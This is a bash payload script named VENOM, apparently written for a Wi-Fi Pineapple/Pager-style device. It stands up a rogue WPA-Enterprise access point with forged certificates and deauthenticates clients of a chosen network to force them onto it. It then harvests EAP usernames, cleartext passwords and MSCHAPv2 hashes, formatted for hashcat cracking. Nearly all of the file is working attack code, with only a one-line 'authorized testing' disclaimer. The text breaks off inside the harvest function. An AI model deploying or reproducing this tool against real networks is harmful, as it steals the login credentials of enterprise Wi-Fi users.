#!/bin/bash
# Title: VENOM - WPA-Enterprise Credential Harvester
# Author: sinX
# Description: Deploys rogue WPA-Enterprise AP to capture EAP identities and credentials
# Version: 1.0
# Category: Exfiltration
# Dependencies: openssl-util, tcpdump (optional)
# Target: WPA-Enterprise / 802.1X networks
#
# Captures EAP identities (usernames), cleartext passwords via GTC/PAP,
# and MSCHAPv2 challenge/response hashes for offline cracking with hashcat.
# Does NOT modify any system packages - uses standalone hostapd binary.
#
# LED State Descriptions
# Cyan Solid    - Phase 1: Scanning for enterprise networks
# Amber Solid   - Phase 2: Generating certs, creating interface
# Red Solid     - Phase 3: Rogue AP active, capturing credentials
# Green Solid   - Phase 4: Harvesting results
# Magenta Solid - Error condition
# White Solid   - Idle / Complete
#
# AUTHORIZED SECURITY TESTING ONLY

# ============================================
# CONFIGURATION
# ============================================

# Loot and temp directories
LOOT_DIR="/root/loot/venom"
TEMP_DIR="/tmp/venom"
CERT_DIR="$TEMP_DIR/certs"
HOSTAPD_CONF="$TEMP_DIR/hostapd-venom.conf"
EAP_USER_FILE="$TEMP_DIR/eap_users"
HOSTAPD_LOG="$TEMP_DIR/hostapd.log"
TCPDUMP_PCAP="$TEMP_DIR/eap_capture.pcap"

# Rogue AP settings
VENOM_IFACE="wlan_venom"
PHY_DEVICE="phy1"
DEFAULT_CHANNEL=6
DEFAULT_HW_MODE="g"

# Hostapd binary (set during dep check - may use standalone)
HOSTAPD_BIN="hostapd"

# Certificate settings
CERT_CN="radius.corp.local"
CERT_ORG="Internal Certificate Authority"
CERT_DAYS=365

# Input device for button detection
INPUT=/dev/input/event0

# Process tracking
HOSTAPD_PID=""
TCPDUMP_PID=""

# Counters
IDENTITY_COUNT=0
CLEARTEXT_COUNT=0
MSCHAPV2_COUNT=0

# Session tracking
SESSION_DIR=""
SESSION_LOG=""
START_TIME=""

# Target info
TARGET_SSID=""
TARGET_BSSID=""
TARGET_CHANNEL=""
TARGET_SIGNAL=""

# ============================================
# HELPERS
# ============================================

logboth() {
    local color="$1"
    local msg="$2"
    if [ -z "$msg" ]; then
        msg="$color"
        LOG "$msg"
    else
        LOG "$color" "$msg"
    fi
    [ -n "$SESSION_LOG" ] && echo "$(date '+%H:%M:%S') $msg" >> "$SESSION_LOG"
}

cleanup() {
    LOG yellow "Cleaning up..."

    # Kill hostapd
    if [ -n "$HOSTAPD_PID" ] && kill -0 "$HOSTAPD_PID" 2>/dev/null; then
        kill "$HOSTAPD_PID" 2>/dev/null
        sleep 1
        kill -9 "$HOSTAPD_PID" 2>/dev/null
    fi

    # Kill tcpdump
    if [ -n "$TCPDUMP_PID" ] && kill -0 "$TCPDUMP_PID" 2>/dev/null; then
        kill "$TCPDUMP_PID" 2>/dev/null
    fi

    # Kill any stray hostapd on our interface
    pkill -f "hostapd.*$VENOM_IFACE" 2>/dev/null

    # Remove virtual interface
    if iw dev "$VENOM_IFACE" info >/dev/null 2>&1; then
        ifconfig "$VENOM_IFACE" down 2>/dev/null
        iw dev "$VENOM_IFACE" del 2>/dev/null
    fi

    # Clean temp files (preserve loot)
    rm -rf "$TEMP_DIR"

    LED WHITE
}

trap cleanup EXIT INT TERM

check_for_stop() {
    local data=$(timeout 0.1 dd if=$INPUT bs=16 count=1 2>/dev/null | hexdump -e '16/1 "%02x "' 2>/dev/null)
    [ -z "$data" ] && return 1

    local evtype=$(echo "$data" | cut -d' ' -f9-10)
    local evvalue=$(echo "$data" | cut -d' ' -f13)

    if [ "$evtype" = "01 00" ] && [ "$evvalue" = "01" ]; then
        return 0
    fi
    return 1
}

# ============================================
# LED & SOUND
# ============================================

led_recon()   { LED CYAN; }
led_setup()   { LED AMBER; }
led_deploy()  { LED RED; }
led_harvest() { LED GREEN; }
led_error()   { LED MAGENTA; }

play_capture() {
    RINGTONE "cap:d=16,o=6,b=200:c,e,g,c7" &
}

play_complete() {
    RINGTONE "done:d=4,o=5,b=180:g,e,c,g4" &
}

play_fail() {
    RINGTONE "fail:d=4,o=4,b=120:g,e,c" &
}

# ============================================
# PHASE 0: DEPENDENCY CHECK
# ============================================

check_deps() {
    local missing=0

    # Check for openssl
    if ! command -v openssl >/dev/null 2>&1; then
        LOG red "openssl not found"
        missing=1
    fi

    # Check for iw
    if ! command -v iw >/dev/null 2>&1; then
        LOG red "iw not found"
        missing=1
    fi

    # Check for tcpdump (optional)
    if ! command -v tcpdump >/dev/null 2>&1; then
        LOG yellow "tcpdump not found (optional)"
    fi

    if [ "$missing" -eq 1 ]; then
        resp=$(CONFIRMATION_DIALOG "Missing dependencies.\nAttempt auto-install?")
        case $? in
            $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
                return 1
                ;;
        esac

        if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
            local sid=$(START_SPINNER "Installing packages...")
            opkg update >/dev/null 2>&1
            opkg install openssl-util tcpdump >/dev/null 2>&1
            STOP_SPINNER $sid

            if ! command -v openssl >/dev/null 2>&1; then
                ERROR_DIALOG "openssl install failed"
                return 1
            fi
            LOG green "Packages installed"
        else
            return 1
        fi
    fi

    # Check for hostapd with EAP server support
    # wpad-basic (stock Pager) does NOT support eap_server=1
    # Instead of replacing system packages, we extract a standalone
    # hostapd-openssl binary to /tmp - nothing on the Pager is modified
    if opkg list-installed 2>/dev/null | grep -q "wpad-openssl\|hostapd-openssl"; then
        # Already has EAP support, use system hostapd
        HOSTAPD_BIN="hostapd"
        LOG green "hostapd EAP support detected"
    elif [ -f "$TEMP_DIR/hostapd" ]; then
        # Standalone binary already extracted from a previous run
        HOSTAPD_BIN="$TEMP_DIR/hostapd"
        LOG green "Using standalone hostapd"
    else
        LOG yellow "Stock wpad lacks EAP server"
        LOG yellow "Will fetch standalone hostapd"

        resp=$(CONFIRMATION_DIALOG "Download standalone hostapd\nwith EAP support?\n\nNothing on your Pager\nwill be modified.")
        case $? in
            $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
                return 1
                ;;
        esac

        if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
            local sid=$(START_SPINNER "Downloading hostapd...")
            mkdir -p "$TEMP_DIR/pkg"
            cd "$TEMP_DIR/pkg" || return 1

            opkg update >/dev/null 2>&1
            opkg download hostapd-openssl >/dev/null 2>&1

            local pkg_file=$(ls hostapd-openssl*.ipk 2>/dev/null | head -1)
            if [ -z "$pkg_file" ]; then
                # Fallback: try wpad-openssl package
                opkg download wpad-openssl >/dev/null 2>&1
                pkg_file=$(ls wpad-openssl*.ipk 2>/dev/null | head -1)
            fi

            STOP_SPINNER $sid

            if [ -z "$pkg_file" ]; then
                ERROR_DIALOG "Download failed.\nCheck internet connection."
                cd /
                return 1
            fi

            # Extract hostapd binary from .ipk without installing
            # ipk = tar.gz containing data.tar.gz with the actual files
            LOG blue "Extracting hostapd binary..."
            tar xzf "$pkg_file" ./data.tar.gz 2>/dev/null
            tar xzf data.tar.gz ./usr/sbin/hostapd 2>/dev/null

            if [ -f "./usr/sbin/hostapd" ]; then
                cp "./usr/sbin/hostapd" "$TEMP_DIR/hostapd"
                chmod +x "$TEMP_DIR/hostapd"
                HOSTAPD_BIN="$TEMP_DIR/hostapd"
                LOG green "Standalone hostapd ready"
            else
                ERROR_DIALOG "Failed to extract hostapd\nfrom package"
                cd /
                return 1
            fi

            # Cleanup package files
            cd /
            rm -rf "$TEMP_DIR/pkg"
        else
            ERROR_DIALOG "hostapd with EAP support\nis required"
            return 1
        fi
    fi

    LOG green "Dependencies OK"
    return 0
}

# ============================================
# PHASE 1: RECON
# ============================================

# Scan arrays
declare -a ENTERPRISE_SSIDS
declare -a ENTERPRISE_BSSIDS
declare -a ENTERPRISE_CHANNELS
declare -a ENTERPRISE_SIGNALS
ENTERPRISE_COUNT=0

scan_enterprise_networks() {
    LOG blue "Scanning for enterprise networks..."
    led_recon
    local sid=$(START_SPINNER "Scanning WiFi...")

    ENTERPRISE_SSIDS=()
    ENTERPRISE_BSSIDS=()
    ENTERPRISE_CHANNELS=()
    ENTERPRISE_SIGNALS=()
    ENTERPRISE_COUNT=0

    # Use iwinfo scan to detect 802.1X/EAP networks
    local scan_output
    scan_output=$(iwinfo wlan1 scan 2>/dev/null)

    if [ -z "$scan_output" ]; then
        scan_output=$(iwinfo wlan1mon scan 2>/dev/null)
    fi

    STOP_SPINNER $sid

    if [ -z "$scan_output" ]; then
        LOG red "Scan failed - no results"
        return 1
    fi

    # Parse iwinfo output for 802.1X/EAP networks
    local current_bssid=""
    local current_ssid=""
    local current_channel=""
    local current_signal=""
    local current_is_enterprise=false

    while IFS= read -r line; do
        case "$line" in
            *"Cell"*"Address:"*|*"BSS"*|*"ESSID"*|*"Channel:"*|*"Signal:"*|*"signal:"*|*"Encryption:"*|*"802.1X"*|*"EAP"*)
                ;;
            *)
                continue
                ;;
        esac

        case "$line" in
            *"Cell"*"Address:"*|*"BSS "*)
                # Save previous entry if enterprise
                if [ "$current_is_enterprise" = true ] && [ -n "$current_ssid" ]; then
                    ENTERPRISE_SSIDS+=("$current_ssid")
                    ENTERPRISE_BSSIDS+=("$current_bssid")
                    ENTERPRISE_CHANNELS+=("${current_channel:-$DEFAULT_CHANNEL}")
                    ENTERPRISE_SIGNALS+=("${current_signal:--99}")
                fi
                current_bssid=$(echo "$line" | grep -oE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}')
                current_ssid=""
                current_channel=""
                current_signal=""
                current_is_enterprise=false
                ;;
            *"ESSID:"*)
                current_ssid=$(echo "$line" | sed 's/.*ESSID: "//;s/".*//')
                ;;
            *"Channel:"*)
                current_channel=$(echo "$line" | grep -oE 'Channel: [0-9]+' | awk '{print $2}')
                ;;
            *"Signal:"*|*"signal:"*)
                current_signal=$(echo "$line" | grep -oE '\-[0-9]+' | head -1)
                ;;
            *"802.1X"*|*"EAP"*|*"Enterprise"*)
                current_is_enterprise=true
                ;;
        esac
    done <<< "$scan_output"

    # Don't forget last entry
    if [ "$current_is_enterprise" = true ] && [ -n "$current_ssid" ]; then
        ENTERPRISE_SSIDS+=("$current_ssid")
        ENTERPRISE_BSSIDS+=("$current_bssid")
        ENTERPRISE_CHANNELS+=("${current_channel:-$DEFAULT_CHANNEL}")
        ENTERPRISE_SIGNALS+=("${current_signal:--99}")
    fi

    ENTERPRISE_COUNT=${#ENTERPRISE_SSIDS[@]}

    if [ "$ENTERPRISE_COUNT" -eq 0 ]; then
        LOG yellow "No WPA-Enterprise networks found"
        return 1
    fi

    LOG green "Found $ENTERPRISE_COUNT enterprise network(s)"
    return 0
}

# Target selection UI (scrollable picker)
show_enterprise_target() {
    local idx=$1
    LOG ""
    LOG green "[$((idx + 1))/$ENTERPRISE_COUNT] ${ENTERPRISE_SSIDS[$idx]}"
    LOG "BSSID: ${ENTERPRISE_BSSIDS[$idx]}"
    LOG "Ch: ${ENTERPRISE_CHANNELS[$idx]}  Signal: ${ENTERPRISE_SIGNALS[$idx]} dBm"
    LOG ""
    LOG "UP/DOWN=Scroll  A=Select  B=Manual"
}

select_target() {
    local selected=0
    show_enterprise_target $selected

    while true; do
        local btn=$(WAIT_FOR_INPUT)
        case "$btn" in
            UP|LEFT)
                selected=$((selected - 1))
                [ $selected -lt 0 ] && selected=$((ENTERPRISE_COUNT - 1))
                show_enterprise_target $selected
                ;;
            DOWN|RIGHT)
                selected=$((selected + 1))
                [ $selected -ge $ENTERPRISE_COUNT ] && selected=0
                show_enterprise_target $selected
                ;;
            A)
                TARGET_SSID="${ENTERPRISE_SSIDS[$selected]}"
                TARGET_BSSID="${ENTERPRISE_BSSIDS[$selected]}"
                TARGET_CHANNEL="${ENTERPRISE_CHANNELS[$selected]}"
                TARGET_SIGNAL="${ENTERPRISE_SIGNALS[$selected]}"
                return 0
                ;;
            B|BACK)
                return 1
                ;;
        esac
    done
}

manual_target_entry() {
    local resp

    resp=$(TEXT_PICKER "Target SSID" "CorpWiFi")
    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            return 1
            ;;
    esac
    if [ -z "$resp" ]; then
        ERROR_DIALOG "SSID cannot be empty"
        return 1
    fi
    TARGET_SSID="$resp"

    resp=$(NUMBER_PICKER "Channel (1-165)" "$DEFAULT_CHANNEL")
    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            return 1
            ;;
    esac
    TARGET_CHANNEL="${resp:-$DEFAULT_CHANNEL}"

    TARGET_BSSID=""
    TARGET_SIGNAL=""
    return 0
}

# ============================================
# PHASE 2: SETUP
# ============================================

generate_certs() {
    logboth blue "Generating certificates..."
    local sid=$(START_SPINNER "Generating certs...")

    mkdir -p "$CERT_DIR"

    # CA private key
    openssl genrsa -out "$CERT_DIR/ca.key" 2048 2>/dev/null

    # CA certificate
    openssl req -new -x509 -days "$CERT_DAYS" \
        -key "$CERT_DIR/ca.key" \
        -out "$CERT_DIR/ca.pem" \
        -subj "/C=US/ST=State/L=City/O=$CERT_ORG/CN=Internal Root CA" \
        2>/dev/null

    # Server private key
    openssl genrsa -out "$CERT_DIR/server.key" 2048 2>/dev/null

    # Server CSR
    openssl req -new \
        -key "$CERT_DIR/server.key" \
        -out "$CERT_DIR/server.csr" \
        -subj "/C=US/ST=State/L=City/O=$CERT_ORG/CN=$CERT_CN" \
        2>/dev/null

    # Sign server cert with CA
    openssl x509 -req -days "$CERT_DAYS" \
        -in "$CERT_DIR/server.csr" \
        -CA "$CERT_DIR/ca.pem" \
        -CAkey "$CERT_DIR/ca.key" \
        -CAcreateserial \
        -out "$CERT_DIR/server.pem" \
        2>/dev/null

    # DH parameters (1024-bit for speed on ARM)
    openssl dhparam -out "$CERT_DIR/dh.pem" 1024 2>/dev/null

    STOP_SPINNER $sid

    if [ -f "$CERT_DIR/ca.pem" ] && [ -f "$CERT_DIR/server.pem" ] && \
       [ -f "$CERT_DIR/server.key" ] && [ -f "$CERT_DIR/dh.pem" ]; then
        logboth green "Certificates generated"
        return 0
    else
        logboth red "Certificate generation failed"
        return 1
    fi
}

create_virtual_interface() {
    logboth blue "Creating virtual interface..."

    # Remove if exists
    if iw dev "$VENOM_IFACE" info >/dev/null 2>&1; then
        iw dev "$VENOM_IFACE" del 2>/dev/null
        sleep 1
    fi

    # Create managed interface on phy1 (secondary radio)
    iw phy "$PHY_DEVICE" interface add "$VENOM_IFACE" type managed 2>/dev/null

    if ! iw dev "$VENOM_IFACE" info >/dev/null 2>&1; then
        # Fallback: try __ap type
        iw phy "$PHY_DEVICE" interface add "$VENOM_IFACE" type __ap 2>/dev/null
    fi

    if ! iw dev "$VENOM_IFACE" info >/dev/null 2>&1; then
        logboth red "Failed to create $VENOM_IFACE on $PHY_DEVICE"
        return 1
    fi

    ifconfig "$VENOM_IFACE" up 2>/dev/null
    sleep 1

    logboth green "Interface $VENOM_IFACE created"
    return 0
}

write_eap_user_file() {
    # EAP user file: accept any identity for credential capture
    # Phase 1 = outer tunnel negotiation
    # Phase 2 = inner auth (where we capture creds)
    cat > "$EAP_USER_FILE" << 'EAPEOF'
# Phase 1 - outer tunnel (any identity triggers PEAP/TTLS)
* PEAP,TTLS,TLS,FAST

# Phase 2 - inner auth methods
# GTC/PAP = cleartext password capture
# MSCHAPv2 = challenge/response hash capture
"t" TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS "t" [2]
EAPEOF

    if [ -f "$EAP_USER_FILE" ]; then
        logboth green "EAP user file created"
        return 0
    else
        logboth red "EAP user file failed"
        return 1
    fi
}

write_hostapd_config() {
    local ssid="$1"
    local channel="$2"

    # Determine hw_mode based on channel
    local hw_mode="$DEFAULT_HW_MODE"
    if [ "$channel" -gt 14 ] 2>/dev/null; then
        hw_mode="a"
    fi

    cat > "$HOSTAPD_CONF" << HOSTAPDEOF
# VENOM - Rogue WPA-Enterprise AP
interface=$VENOM_IFACE
driver=nl80211
ssid=$ssid
channel=$channel
hw_mode=$hw_mode

# WPA-Enterprise
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
rsn_pairwise=CCMP
ieee8021x=1

# Built-in EAP server (no external RADIUS needed)
eap_server=1
eap_user_file=$EAP_USER_FILE

# Certificates
ca_cert=$CERT_DIR/ca.pem
server_cert=$CERT_DIR/server.pem
private_key=$CERT_DIR/server.key
dh_file=$CERT_DIR/dh.pem

# EAP-FAST provisioning
eap_fast_a_id=101112131415161718191a1b1c1d1e1f
eap_fast_a_id_info=hostapd
eap_fast_prov=3

# Maximum debug logging (critical for credential capture)
logger_syslog=-1
logger_syslog_level=0
logger_stdout=-1
logger_stdout_level=0

# Allow all clients
ap_isolate=0
HOSTAPDEOF

    if [ -f "$HOSTAPD_CONF" ]; then
        logboth green "hostapd config written"
        return 0
    else
        logboth red "hostapd config failed"
        return 1
    fi
}

# ============================================
# PHASE 3: DEPLOY
# ============================================

start_hostapd() {
    logboth blue "Starting rogue AP..."
    local sid=$(START_SPINNER "Starting hostapd...")

    # Kill any existing instance on our interface
    pkill -f "hostapd.*$VENOM_IFACE" 2>/dev/null
    sleep 1

    # Start hostapd with max debug logging (uses standalone binary if needed)
    "$HOSTAPD_BIN" -dd "$HOSTAPD_CONF" > "$HOSTAPD_LOG" 2>&1 &
    HOSTAPD_PID=$!

    # Wait for startup
    sleep 3

    STOP_SPINNER $sid

    # Verify running
    if ! kill -0 "$HOSTAPD_PID" 2>/dev/null; then
        logboth red "hostapd failed to start"
        if [ -f "$HOSTAPD_LOG" ]; then
            tail -5 "$HOSTAPD_LOG" 2>/dev/null | while IFS= read -r line; do
                LOG red "  $line"
            done
        fi
        return 1
    fi

    logboth green "Rogue AP online: $TARGET_SSID"
    return 0
}

start_capture() {
    if ! command -v tcpdump >/dev/null 2>&1; then
        logboth yellow "tcpdump unavailable, skipping raw capture"
        return 0
    fi

    tcpdump -i "$VENOM_IFACE" -w "$TCPDUMP_PCAP" -s 0 \
        'ether proto 0x888e' \
        >/dev/null 2>&1 &
    TCPDUMP_PID=$!

    logboth green "Packet capture started"
    return 0
}

deauth_target_clients() {
    if [ -z "$TARGET_BSSID" ]; then
        logboth yellow "No target BSSID - skipping deauth"
        return 0
    fi

    resp=$(CONFIRMATION_DIALOG "Deauth clients from\n$TARGET_SSID?\n\nForces reconnection\nto rogue AP")
    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            return 0
            ;;
    esac

    if [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
        logboth "Skipping deauth"
        return 0
    fi

    local burst_count
    burst_count=$(NUMBER_PICKER "Deauth packets" 30)
    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            burst_count=30
            ;;
    esac

    logboth yellow "Sending $burst_count deauths..."

    local i=0
    while [ $i -lt $burst_count ]; do
        PINEAPPLE_DEAUTH_CLIENT "$TARGET_BSSID" "FF:FF:FF:FF:FF:FF" "$TARGET_CHANNEL"
        i=$((i + 1))
        sleep 0.1
    done

    logboth green "Deauth burst complete ($burst_count packets)"
    VIBRATE
    return 0
}

# ============================================
# CREDENTIAL PARSING
# ============================================

parse_credentials() {
    local log_file="$1"
    local output_dir="$2"

    local identities_file="$output_dir/identities.txt"
    local cleartext_file="$output_dir/cleartext_creds.txt"
    local mschapv2_file="$output_dir/mschapv2_hashes.txt"
    local hashcat_file="$output_dir/hashcat_5500.txt"

    IDENTITY_COUNT=0
    CLEARTEXT_COUNT=0
    MSCHAPV2_COUNT=0

    if [ ! -f "$log_file" ]; then
        return 1
    fi

    # --- EAP Identities (usernames) ---
    # hostapd debug logs: "identity='user'" or "EAP-Response/Identity"
    {
        grep -ioP "(?<=identity=')[^']*" "$log_file" 2>/dev/null
        grep -ioP "(?<=identity=\")[^\"]*" "$log_file" 2>/dev/null
        grep -ioP "(?<=Identity: ')[^']*" "$log_file" 2>/dev/null
        grep -ioP "(?<=EAP-Identity: )[^ ]*" "$log_file" 2>/dev/null
    } | sort -u > "$identities_file" 2>/dev/null

    IDENTITY_COUNT=$(wc -l < "$identities_file" 2>/dev/null | tr -d ' ')
    [ -z "$IDENTITY_COUNT" ] && IDENTITY_COUNT=0

    # --- GTC/PAP Cleartext Passwords ---
    # GTC: "eap_gtc_process: Response='password'"
    # PAP: "EAP-TTLS/PAP: Password='password'"
    {
        grep -ioP "(?<=Response=')[^']*" "$log_file" 2>/dev/null
        grep -ioP "(?<=Password=')[^']*" "$log_file" 2>/dev/null
        grep -ioP "(?<=password=\")[^\"]*" "$log_file" 2>/dev/null
    } | sort -u > "$cleartext_file" 2>/dev/null

    CLEARTEXT_COUNT=$(wc -l < "$cleartext_file" 2>/dev/null | tr -d ' ')
    [ -z "$CLEARTEXT_COUNT" ] && CLEARTEXT_COUNT=0

    # --- MSCHAPv2 Challenge/Response Hashes ---
    # hostapd debug:
    #   MSCHAPV2: auth_challenge = <hex>
    #   MSCHAPV2: peer_challenge = <hex>
    #   MSCHAPV2: username = <username>
    #   MSCHAPV2: nt_response = <hex>
    # Hashcat mode 5500: username::::nt_response:auth_challenge

    local auth_challenge=""
    local peer_challenge=""
    local mschap_user=""
    local nt_response=""

    > "$mschapv2_file" 2>/dev/null
    > "$hashcat_file" 2>/dev/null

    while IFS= read -r line; do
        case "$line" in
            *[Mm][Ss][Cc][Hh][Aa][Pp][Vv]2*[Aa]uth*[Cc]hallenge*)
                auth_challenge=$(echo "$line" | grep -oE '[0-9a-fA-F]{32,}' | tail -1)
                ;;
            *[Mm][Ss][Cc][Hh][Aa][Pp][Vv]2*[Pp]eer*[Cc]hallenge*)
                peer_challenge=$(echo "$line" | grep -oE '[0-9a-fA-F]{32,}' | tail -1)
                ;;
            *[Mm][Ss][Cc][Hh][Aa][Pp][Vv]2*[Uu]sername*)
                mschap_user=$(echo "$line" | sed "s/.*[Uu]sername[= ]*['\"]*//" | sed "s/['\"].*//" | tr -d ' ')
                ;;
            *[Mm][Ss][Cc][Hh][Aa][Pp][Vv]2*[Nn][Tt]_*[Rr]esponse*|*[Mm][Ss][Cc][Hh][Aa][Pp][Vv]2*[Nn][Tt]\ *[Rr]esponse*)
                nt_response=$(echo "$line" | grep -oE '[0-9a-fA-F]{48}' | tail -1)

                # Complete set captured - write hash
                if [ -n "$mschap_user" ] && [ -n "$nt_response" ] && [ -n "$auth_challenge" ]; then
                    echo "${mschap_user}::::${nt_response}:${auth_challenge}" >> "$hashcat_file"
                    echo "User: $mschap_user | Auth: $auth_challenge | Peer: ${peer_challenge:-N/A} | NT: $nt_response" >> "$mschapv2_file"
                    MSCHAPV2_COUNT=$((MSCHAPV2_COUNT + 1))

                    # Reset for next capture
                    auth_challenge=""
                    peer_challenge=""
                    mschap_user=""
                    nt_response=""
                fi
                ;;
        esac
    done < "$log_file"

    return 0
}

# ============================================
# LIVE MONITORING
# ============================================

live_monitor() {
    LOG ""
    logboth green "=== VENOM ACTIVE ==="
    logboth green "Rogue AP: $TARGET_SSID"
    logboth green "Channel: $TARGET_CHANNEL"
    LOG ""
    LOG yellow "Press button to stop"
    LOG ""

    led_deploy

    local last_log_size=0
    local loop_count=0
    local seen_identities=""

    while true; do
        # Check for stop
        if check_for_stop; then
            logboth yellow "Stop requested"
            break
        fi

        loop_count=$((loop_count + 1))

        # Parse log every ~2 seconds (4 x 0.5s loops)
        if [ $((loop_count % 4)) -eq 0 ] && [ -f "$HOSTAPD_LOG" ]; then
            local current_size
            current_size=$(wc -c < "$HOSTAPD_LOG" 2>/dev/null | tr -d ' ')
            [ -z "$current_size" ] && current_size=0

            if [ "$current_size" -gt "$last_log_size" ]; then
                last_log_size="$current_size"

                # Check for new EAP identities
                local new_id
                new_id=$(grep -ioP "(?<=identity=')[^']*" "$HOSTAPD_LOG" 2>/dev/null | tail -1)
                if [ -z "$new_id" ]; then
                    new_id=$(grep -ioP "(?<=Identity: ')[^']*" "$HOSTAPD_LOG" 2>/dev/null | tail -1)
                fi

                if [ -n "$new_id" ] && ! echo "$seen_identities" | grep -qF "$new_id"; then
                    seen_identities="${seen_identities}${new_id}|"
                    IDENTITY_COUNT=$((IDENTITY_COUNT + 1))
                    logboth green "EAP Identity: $new_id"
                    VIBRATE
                    play_capture
                fi

                # Check for GTC/PAP cleartext
                local ct_count
                ct_count=$(grep -ic "Response='\|Password='" "$HOSTAPD_LOG" 2>/dev/null | tr -d ' ')
                [ -z "$ct_count" ] && ct_count=0

                if [ "$ct_count" -gt "$CLEARTEXT_COUNT" ]; then
                    CLEARTEXT_COUNT="$ct_count"
                    logboth green "CLEARTEXT PASSWORD CAPTURED!"
                    VIBRATE
                    VIBRATE
                    play_capture
                fi

                # Check for MSCHAPv2 hashes
                local ms_count
                ms_count=$(grep -ic "nt_response\|NT response" "$HOSTAPD_LOG" 2>/dev/null | tr -d ' ')
                [ -z "$ms_count" ] && ms_count=0

                if [ "$ms_count" -gt "$MSCHAPV2_COUNT" ]; then
                    MSCHAPV2_COUNT="$ms_count"
                    logboth yellow "MSCHAPv2 hash captured!"
                    VIBRATE
                    play_capture
                fi
            fi
        fi

        # Status update every ~10 seconds
        if [ $((loop_count % 20)) -eq 0 ]; then
            local uptime=$((loop_count / 2))
            LOG blue "--- Status [${uptime}s] ---"
            LOG blue "Identities: $IDENTITY_COUNT"
            LOG blue "Cleartext:  $CLEARTEXT_COUNT"
            LOG blue "MSCHAPv2:   $MSCHAPV2_COUNT"
        fi

        # Check hostapd still running
        if [ -n "$HOSTAPD_PID" ] && ! kill -0 "$HOSTAPD_PID" 2>/dev/null; then
            logboth red "hostapd died unexpectedly!"
            led_error
            break
        fi

        sleep 0.5
    done
}

# ============================================
# PHASE 4: HARVEST
# ============================================

generate_report() {
    local dir="$1"
    local report="$dir/report.txt"
    local duration
    duration=$(cat "$dir/duration.txt" 2>/dev/null || echo "N/A")

    {
        echo "======================================"
        echo "  VENOM - Engagement Report"
        echo "======================================"
        echo ""
        echo "Date:     $(date '+%Y-%m-%d %H:%M:%S')"
        echo "Target:   $TARGET_SSID"
        echo "BSSID:    ${TARGET_BSSID:-N/A}"
        echo "Channel:  $TARGET_CHANNEL"
        echo "Duration: $duration"
        echo ""
        echo "======================================"
        echo "  RESULTS"
        echo "======================================"
        echo ""
        echo "EAP Identities:       $IDENTITY_COUNT"
        echo "Cleartext Passwords:  $CLEARTEXT_COUNT"
        echo "MSCHAPv2 Hashes:      $MSCHAPV2_COUNT"
        echo ""

        if [ -f "$dir/identities.txt" ] && [ -s "$dir/identities.txt" ]; then
            echo "--- CAPTURED IDENTITIES ---"
            cat "$dir/identities.txt"
            echo ""
        fi

        if [ -f "$dir/cleartext_creds.txt" ] && [ -s "$dir/cleartext_creds.txt" ]; then
            echo "--- CLEARTEXT CREDENTIALS ---"
            cat "$dir/cleartext_creds.txt"
            echo ""
        fi

        if [ -f "$dir/mschapv2_hashes.txt" ] && [ -s "$dir/mschapv2_hashes.txt" ]; then
            echo "--- MSCHAPv2 HASHES ---"
            cat "$dir/mschapv2_hashes.txt"
            echo ""
        fi

        if [ -f "$dir/hashcat_5500.txt" ] && [ -s "$dir/hashcat_5500.txt" ]; then
            echo "--- HASHCAT FORMAT (mode 5500) ---"
            cat "$dir/hashcat_5500.txt"
            echo ""
            echo "Crack: hashcat -m 5500 hashcat_5500.txt wordlist.txt"
            echo ""
        fi

        echo "--- FILES ---"
        ls -la "$dir" 2>/dev/null
        echo ""
        echo "======================================"
        echo "  END OF REPORT"
        echo "======================================"
    } > "$report"
}

harvest_results() {
    LOG ""
    logboth yellow "=== HARVESTING ==="
    led_harvest

    # Stop hostapd
    if [ -n "$HOSTAPD_PID" ] && kill -0 "$HOSTAPD_PID" 2>/dev/null; then
        kill "$HOSTAPD_PID" 2>/dev/null
        sleep 1
        kill -9 "$HOSTAPD_PID" 2>/dev/null
        HOSTAPD_PID=""
    fi

    # Stop tcpdump
    if [ -n "$TCPDUMP_PID" ] && kill -0 "$TCPDUMP_PID" 2>/dev/null; then
        kill "$TCPDUMP_PID" 2>/dev/null
        TCPDUMP_PID=""
    fi

    # Remove interface
    if iw dev "$VENOM_IFACE" info >/dev/null 2>&1; then
        ifconfig "$VENOM_IFACE" down 2>/dev/null
        iw dev "$VENOM_IFACE" del 2>/dev/null
    fi

    # Final credential parse
    local sid=$(START_SPINNER "Parsing credentials...")
    parse_credentials "$HOSTAPD_LOG" "$SESSION_DIR"
    STOP_SPINNER $sid

    # Copy raw data to loot
    cp "$HOSTAPD_LOG" "$SESSION_DIR/hostapd_debug.log" 2>/dev/null
    if [ -f "$TCPDUMP_PCAP" ]; then
        cp "$TCPDUMP_PCAP" "$SESSION_DIR/eap_capture.pcap" 2>/dev/null
    fi

    # Record duration
    local end_time=$(date +%s)
    local duration=$((end_time - START_TIME))
    local dur_min=$((duration / 60))
    local dur_sec=$((duration % 60))
    echo "${dur_min}m ${dur_sec}s" > "$SESSION_DIR/duration.txt"

    # Generate report
    generate_report "$SESSION_DIR"

    # Display summary
    LOG ""
    LOG green "=========================================="
    LOG green "  VENOM HARVEST COMPLETE"
    LOG green "=========================================="
    LOG ""
    LOG blue "Target:     $TARGET_SSID"
    LOG blue "Duration:   ${dur_min}m ${dur_sec}s"
    LOG ""
    LOG green "Identities:       $IDENTITY_COUNT"
    LOG green "Cleartext creds:  $CLEARTEXT_COUNT"
    LOG yellow "MSCHAPv2 hashes:  $MSCHAPV2_COUNT"
    LOG ""
    LOG blue "Loot: $SESSION_DIR"

